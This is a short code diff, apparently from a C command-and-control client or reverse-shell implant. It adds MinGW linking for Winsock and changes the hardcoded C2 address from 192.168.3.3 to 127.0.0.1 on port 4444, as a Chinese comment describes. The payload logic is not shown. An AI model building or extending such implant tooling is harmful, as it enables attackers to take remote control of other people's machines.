@@ -7,7 +7,18 @@
     #include <winsock2.h>
     #include <windows.h>
     #include <direct.h>
-    #pragma comment(lib, "ws2_32.lib")
+    
+    // 微软官方的编译器cl用这个
+    #ifdef _MSC_VER
+        #pragma comment(lib, "ws2_32.lib")
+    #endif
+
+    // MinGW / W64devkit GCC用这个
+    #ifdef __MINGW32__
+        __attribute__((used, section(".drectve")))
+        static const char * __mingw_lib_ws2_32 = "-lws2_32";
+    #endif
+    
     #define chdir _chdir
     #define getcwd _getcwd
 #else
@@ -21,7 +32,7 @@
 #endif
 
 // 你可以根据需要修改 C2 的 IP 和端口
-#define C2_IP "192.168.3.3" 
+#define C2_IP "127.0.0.1" 
 #define C2_PORT 4444
 #define BUF_SIZE 8192
 
